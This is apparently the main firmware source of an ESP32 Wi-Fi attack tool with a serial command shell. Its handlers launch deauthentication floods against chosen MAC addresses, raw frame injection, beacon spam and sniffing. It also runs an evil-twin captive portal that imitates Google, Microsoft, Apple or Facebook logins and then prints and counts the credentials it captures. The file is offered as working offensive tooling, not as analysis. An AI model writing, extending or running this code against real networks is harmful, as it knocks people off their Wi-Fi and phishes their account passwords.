#include "driver/adc.h"
#include "scan.h"
#include "sniff.h"
#include "inject.h"
#include "beacon.h"
#include "deauth.h"
#include "captive_portal.h"
#include "configs.h"

void stopWifi() {
  // Just stop activity, DO NOT deinit the driver here
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();

  // Do NOT call esp_wifi_deinit() here
  // Do NOT destroy netifs here

  adc_power_off();
}

void stopAll() {
  scan_setup("stop");
  sniffer.stop();

  stop_deauth();
  stop_beacon();
  injectorManager.stopAllInjectors();
  portalManager.stopPortal();

  stopWifi();

  delay(1000);

  Serial.println("Everything stopped");
}

// ===== Command Handlers =====
void handleDeauthCommand(String cmd) {
  char srcMac[18] = { 0 }, tgtMac[18] = { 0 };
  int channel = 1;
  int pps = 25;

  int parsed = sscanf(cmd.c_str(), "deauth -s %17s -t %17s -c %d -p %d", srcMac, tgtMac, &channel, &pps);

  if (parsed == 4) {
    if (channel < 1 || channel > 14) {
      Serial.println(F("Error: Channel must be between 1 and 14"));
      return;
    }
    deauth_setup(srcMac, tgtMac, channel, pps);
    Serial.println(F("Deauth started."));
  } else {
    Serial.println(F("Error: Invalid deauth command format"));
    Serial.println(F("Usage: deauth -s <source_mac> -t <target_mac> -c <channel> -p <packets_per_second>"));
  }
}

bool parseInjectCommand(String command, String& injectorName, uint8_t* packetData, uint16_t& packetLen, uint8_t& channel, uint32_t& pps, uint32_t& maxPackets) {
  // Find the space after the injector name
  int spaceIndex = command.indexOf(' ');
  if (spaceIndex == -1) {
    Serial.println("Error: Invalid command format");
    Serial.println("Usage: inject -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }

  injectorName = command.substring(0, spaceIndex);

  // Verify it's a valid injector name (inject followed by a number)
  if (!injectorName.startsWith("inject")) {
    Serial.println("Error: Injector name must start with 'inject'");
    return false;
  }

  // Check if there's a number after "inject"
  String numberPart = injectorName.substring(6);
  if (numberPart.length() == 0) {
    Serial.println("Error: Injector name must be 'inject' followed by a number");
    return false;
  }

  for (char c : numberPart) {
    if (!isdigit(c)) {
      Serial.println("Error: Injector name must be 'inject' followed by a number");
      return false;
    }
  }

  // Now parse the rest of the command
  String restOfCommand = command.substring(spaceIndex + 1);

  // Check for required parameters
  if (!restOfCommand.startsWith("-i ")) {
    Serial.println("Error: Command must start with '-i' after injector name");
    Serial.println("Usage: " + injectorName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }

  // Find parameter indices
  int iIndex = 0;  // -i is at position 0 in restOfCommand
  int chIndex = restOfCommand.indexOf("-ch ");
  int ppsIndex = restOfCommand.indexOf("-pps ");
  int mIndex = restOfCommand.indexOf("-m ");

  if (chIndex == -1 || ppsIndex == -1 || mIndex == -1) {
    Serial.println("Error: Missing required parameters (-ch, -pps, or -m)");
    Serial.println("Usage: " + injectorName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }

  // Extract packet data (hex string between -i and -ch)
  String packetDataStr = restOfCommand.substring(3, chIndex);
  packetDataStr.trim();

  // Extract channel
  String channelStr = restOfCommand.substring(chIndex + 4, ppsIndex);
  channelStr.trim();
  channel = channelStr.toInt();

  // Extract packets per second
  String ppsStr = restOfCommand.substring(ppsIndex + 5, mIndex);
  ppsStr.trim();
  pps = ppsStr.toInt();

  // Extract max packets
  String maxStr = restOfCommand.substring(mIndex + 3);
  maxStr.trim();
  maxPackets = 0;  // 0 means no limit
  if (maxStr != "non") {
    maxPackets = maxStr.toInt();
  }

  // Validate parameters
  if (channel < 1 || channel > 14) {
    Serial.println("Error: Channel must be between 1 and 14");
    return false;
  }

  if (pps == 0) {
    Serial.println("Error: Packets per second must be greater than 0");
    return false;
  }

  if (pps > 1000) {
    Serial.println("Error: Packet rate > 1000");
    return false;
  }

  // Convert hex string to bytes
  hexStringToBytes(packetDataStr, packetData, &packetLen);

  if (packetLen == 0) {
    Serial.println("Error: Invalid packet data format");
    Serial.println("Make sure hex bytes are space-separated and valid");
    return false;
  }

  if (packetLen > 512) {
    Serial.println("Error: Packet too large (max 512 bytes)");
    return false;
  }

  return true;
}

void handleStartCommand(String command) {
  // Remove "captive_portal" and trim
  String params = command.substring(14);
  params.trim();

  // Use stack-allocated strings to avoid heap fragmentation
  char ssid[33] = { 0 };   // Max SSID length is 32
  char pass[65] = { 0 };   // Max password length is 64
  char type[20] = "wifi";  // Default type

  // Parse parameters manually to avoid String operations
  const char* params_cstr = params.c_str();
  int firstSpace = params.indexOf(' ');

  if (firstSpace == -1) {
    Serial.println(F("Error: Missing SSID"));
    Serial.println(F("Usage: start <SSID> [password] [type]"));
    return;
  }

  // Extract SSID
  strncpy(ssid, params_cstr, min(firstSpace, 32));
  ssid[32] = '\0';

  // Find next parts
  int secondSpace = params.indexOf(' ', firstSpace + 1);

  if (secondSpace == -1) {
    // Only SSID and possibly password
    if (params.length() > firstSpace + 1) {
      strncpy(pass, params_cstr + firstSpace + 1, 64);
      pass[64] = '\0';
    }
  } else {
    // Extract password
    strncpy(pass, params_cstr + firstSpace + 1, min(secondSpace - firstSpace - 1, 64));
    pass[64] = '\0';

    // Extract type
    strncpy(type, params_cstr + secondSpace + 1, 19);
    type[19] = '\0';
  }

  // Handle empty password representation
  if (strcmp(pass, "''") == 0 || strcmp(pass, "\"\"") == 0 || strcmp(pass, "null") == 0) {
    pass[0] = '\0';
  }

  // Convert type to lowercase
  for (char* p = type; *p; ++p) *p = tolower(*p);

  // Validate portal type
  if (strcmp(type, "wifi") != 0 && strcmp(type, "google") != 0 && strcmp(type, "microsoft") != 0 && strcmp(type, "apple") != 0 && strcmp(type, "facebook") != 0) {
    Serial.print(F("Invalid portal type: "));
    Serial.println(type);
    Serial.println(F("Valid types: wifi, google, microsoft, apple, facebook"));
    return;
  }

  // Validate password length for secured networks
  if (strlen(pass) > 0 && strlen(pass) < 8) {
    Serial.println(F("Warning: Password should be at least 8 characters for WPA2"));
    Serial.println(F("Using open network instead..."));
    pass[0] = '\0';
  }

  Serial.println(F("Starting portal with:"));
  Serial.print(F("  SSID: "));
  Serial.println(ssid);
  Serial.print(F("  Password: "));
  Serial.println(strlen(pass) >= 8 ? "********" : "(open network)");
  Serial.print(F("  Type: "));
  Serial.println(type);

  if (portalManager.startPortal(ssid, pass, type)) {
    Serial.println(F("Portal started successfully!"));
  } else {
    Serial.println(F("Failed to start portal. Please try again."));
  }
}

void processCommand(String cmd) {
  cmd.trim();

  if (cmd.length() == 0) {
    Serial.print(F("antifi> "));
    return;
  }

  String lowerCmd = cmd;
  lowerCmd.toLowerCase();

  Serial.println();

  bool showPrompt = true;

  // ====== HELP ======
  if (lowerCmd == "help" || lowerCmd == "?") {
    showHelp();
  }
  // ====== VERSION ======
  else if (lowerCmd == "version" || lowerCmd == "v") {
    Serial.println(version);
  }
  // ====== SNIFF ======
  else if (cmd.startsWith("sniff")) {
    int cpos = cmd.indexOf("-c");
    if (cpos < 0) {
      Serial.println("ERROR: missing -c");
      return;
    }

    String arg = cmd.substring(cpos + 2);
    arg.trim();

    Serial.println("Sniffing started");
    delay(1000);

    if (arg.equalsIgnoreCase("all")) {
      sniffer.start(0);
    } else {
      int ch = arg.toInt();
      sniffer.start((uint8_t)ch);
    }

    showPrompt = false;
  }
  // ====== SCAN ======
  else if (lowerCmd.startsWith("scan -t ")) {
    String scanType = lowerCmd.substring(8);
    if (scanType == "ap" || scanType == "sta") {
      scan_setup(scanType.c_str());
      showPrompt = false;
    }
  }
  // ====== INJECT ======
  else if (lowerCmd.startsWith("inject")) {
    // Initialize WiFi
    WiFi.mode(WIFI_STA);

    // Initialize promiscuous mode
    esp_wifi_set_promiscuous(true);

    String injectorName;
    uint8_t packetData[512];
    uint16_t packetLen = 0;
    uint8_t channel = 1;
    uint32_t pps = 0;
    uint32_t maxPackets = 0;

    if (parseInjectCommand(cmd, injectorName, packetData, packetLen, channel, pps, maxPackets)) {
      // Display packet info before starting
      Serial.println("\n=== Configuring Injector ===");
      Serial.println("Name: " + injectorName);
      Serial.println("Packet length: " + String(packetLen) + " bytes");
      Serial.println("Channel: " + String(channel));
      Serial.println("Rate: " + String(pps) + " packets/sec");
      Serial.println("Max packets: " + (maxPackets == 0 ? "Unlimited" : String(maxPackets)));

      injectorManager.startInjector(injectorName, packetData, packetLen, channel, pps, maxPackets);
      Serial.println("Injector " + injectorName + " started successfully");
      Serial.println("===========================\n");
    }
  }
  // ====== LIST INJECTORS ======
  else if (lowerCmd == "list_injectors") {
    injectorManager.listInjectors();
  }
  // ====== DEAUTH ======
  else if (lowerCmd.startsWith("deauth")) {
    handleDeauthCommand(lowerCmd);
  }
  // ====== BEACON ======
  else if (lowerCmd == "beacon -s") {
    beacon_setup();
    showPrompt = false;
  }
  // ====== STOP ALL ======
  else if (lowerCmd == "stop") {
    stopAll();
  }
  // ====== STOP INJECTOR ======
  else if (lowerCmd.startsWith("stop -p ")) {
    String injectorName = cmd.substring(8);
    if (injectorName == "all") {
      injectorManager.stopAllInjectors();
    } else {
      injectorManager.stopInjector(injectorName);
    }
  }
  // ====== CREDS ======
  else if (lowerCmd == "creds") {
    portalManager.printCredentials();
  }
  // ====== CLEAR ======
  else if (lowerCmd == "clear") {
    portalManager.clearCredentials();
    injectorManager.clearAllInjectors();
  }
  // ====== CAPTIVE PORTAL ======
  else if (lowerCmd.startsWith("captive_portal")) {
    handleStartCommand(lowerCmd);
    showPrompt = false;
  }
  // ====== UNKNOWN COMMAND ======
  else {
    Serial.println(F("Error: Unknown command. Type 'help' for available commands."));
  }

  if (showPrompt) {
    Serial.print(F("antifi> "));
  }
}

// ===== Serial Input Handler =====
void handleSerialInput() {
  while (Serial.available()) {
    char c = Serial.read();

    if (c == '\n' || c == '\r') {
      if (inputBuffer.length() > 0) {
        processCommand(inputBuffer);
        inputBuffer = "";
        inputBuffer.reserve(64);
      }
    } else if (c == 8 || c == 127) {  // backspace
      if (inputBuffer.length() > 0) {
        inputBuffer.remove(inputBuffer.length() - 1);
        Serial.print("\b \b");
      }
    } else if (c >= 32 && c <= 126) {  // printable characters
      inputBuffer += c;
    }
  }
}

void updatePortalStatus() {
  static unsigned long lastStatusUpdate = 0;

  if (millis() - lastStatusUpdate > 10000) {  // Every 10 seconds
    lastStatusUpdate = millis();

    if (portalManager.isRunning()) {
      Serial.print("[Status] ");
      Serial.print("SSID: ");
      Serial.print(portalManager.getSSID());
      Serial.print(" | Type: ");
      Serial.print(portalManager.getPortalType());
      Serial.print(" | Clients: ");
      Serial.print(portalManager.getClientCount());
      Serial.print(" | Captured: ");
      Serial.println(portalManager.getCredentialsCaptured());
    }
  }
}

void hexStringToBytes(String hexStr, uint8_t* bytes, uint16_t* len) {
  hexStr.replace(" ", "");
  hexStr.trim();

  // validate characters
  for (size_t i = 0; i < hexStr.length(); ++i) {
    char c = hexStr.charAt(i);
    if (!isxdigit(c)) {
      *len = 0;
      return;
    }
  }

  if (hexStr.length() % 2 != 0) {
    *len = 0;
    return;
  }

  *len = hexStr.length() / 2;
  for (uint16_t i = 0; i < *len; i++) {
    String b = hexStr.substring(i * 2, i * 2 + 2);
    bytes[i] = (uint8_t)strtol(b.c_str(), NULL, 16);
  }
}

// ===== Setup & Loop =====
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(3000);

  pinMode(led, OUTPUT);

  delay(100);

  // Initialize SPI with custom pins
  SPI.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);

  // Initialize SD card
  if (SD.begin(SD_CS_PIN)) {
    Serial.println("SD Card initialized!");
  }

  // Get card type
  uint8_t cardType = SD.cardType();
  Serial.print("Card Type: ");
  if (cardType == CARD_MMC) {
    Serial.println("MMC");
  } else if (cardType == CARD_SD) {
    Serial.println("SDSC");
  } else if (cardType == CARD_SDHC) {
    Serial.println("SDHC");
  } else if (cardType == CARD_NONE) {
    Serial.println("No SD card detected!");
  } else {
    Serial.println("UNKNOWN");
  }

  // Get card size
  uint64_t cardSize = SD.cardSize() / (1024 * 1024);
  Serial.printf("Card Size: %llu MB\n", cardSize);

  // Get used/total space
  uint64_t totalBytes = SD.totalBytes() / (1024 * 1024);
  uint64_t usedBytes = SD.usedBytes() / (1024 * 1024);
  Serial.printf("Total Space: %llu MB\n", totalBytes);
  Serial.printf("Used Space: %llu MB\n", usedBytes);

  for (int i = 0; i < 3; i++) {
    delay(200);
    digitalWrite(led, HIGH);
    delay(200);
    digitalWrite(led, LOW);
  }

  inputBuffer.reserve(64);

  showBanner();
  Serial.print(F("antifi> "));  // Initial prompt
}

void loop() {
  handleSerialInput();
  portalManager.update();
  updatePortalStatus();
  injectorManager.updateInjectors(currentChannel);
  sniffer.update();
  beacon_loop();
  deauth_loop();
  scan_loop();
}